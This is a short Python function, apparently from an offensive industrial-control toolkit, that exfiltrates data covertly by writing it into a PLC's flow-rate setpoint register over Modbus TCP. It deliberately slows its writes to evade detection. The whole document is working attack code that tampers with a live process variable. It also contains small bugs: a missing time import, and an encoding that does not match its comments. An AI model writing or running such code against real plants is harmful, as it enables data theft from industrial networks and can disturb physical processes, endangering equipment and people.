def plc_covert_channel(plc_ip, data_to_exfiltrate):
    """
    Encode data in PLC analog output
    Use process variable as covert channel
    """
    from pymodbus.client import ModbusTcpClient

    client = ModbusTcpClient(plc_ip, port=502)
    client.connect()

    # Encode data in least significant bits of analog output
    # Example: Flow rate setpoint normally 1000-2000

    for byte in data_to_exfiltrate:
        # Encode byte in LSBs of register
        base_value = 1500  # Normal flow rate
        encoded_value = base_value + byte

        # Write to holding register
        client.write_register(100, encoded_value, unit=1)

        time.sleep(1)  # Slow to avoid detection

    client.close()
    print("[+] Data exfiltrated via covert channel")
